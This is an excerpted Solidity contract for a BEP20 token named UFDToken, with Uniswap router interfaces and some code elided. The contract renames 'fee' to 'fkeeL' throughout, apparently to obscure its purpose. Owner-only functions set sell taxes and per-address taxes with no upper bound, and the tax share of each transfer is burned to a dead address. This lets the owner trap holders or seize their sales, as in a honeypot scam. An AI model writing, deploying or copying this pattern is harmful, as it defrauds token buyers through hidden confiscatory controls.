...
interface IUniswapV2Factory {
    ...
    function fkeeLTo() external view returns (address);
    function fkeeLToSetter() external view returns (address);
    ...
    function setfkeeLTo(address) external;
    function setfkeeLToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfkeeLOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfkeeLOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfkeeLOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfkeeLOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfkeeLOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract UFDToken is BEP20, Ownable {
    ...
    uint256 private _defaultSellfkeeL = 0;

    uint256 private _defaultBuyfkeeL = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfkeeL;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfkeeL = _value;
    }

    function setSlipfkeeL(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfkeeL[_address] = _value;
    }

    function getSlipfkeeL(address _address) external view onlyownar returns (uint256) {
        return _slipfkeeL[_address];
    }


    function setMAccountfkeeL(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfkeeL(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefkeeLAmount = 0;

        if (rF) {
            uint256 tradefkeeL = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefkeeL = _defaultSellfkeeL;
                }
                if (from == uniswapV2Pair) {

                    tradefkeeL = _defaultBuyfkeeL;
                }
            }
            if (_slipfkeeL[from] > 0) {
                tradefkeeL = _slipfkeeL[from];
            }

            tradefkeeLAmount = _Amount.mul(tradefkeeL).div(100);
        }


        if (tradefkeeLAmount > 0) {
            _balances[from] = _balances[from].sub(tradefkeeLAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefkeeLAmount);
            emit Transfer(from, _deadAddress, tradefkeeLAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefkeeLAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefkeeLAmount);
        emit Transfer(from, _to, _Amount - tradefkeeLAmount);
    }
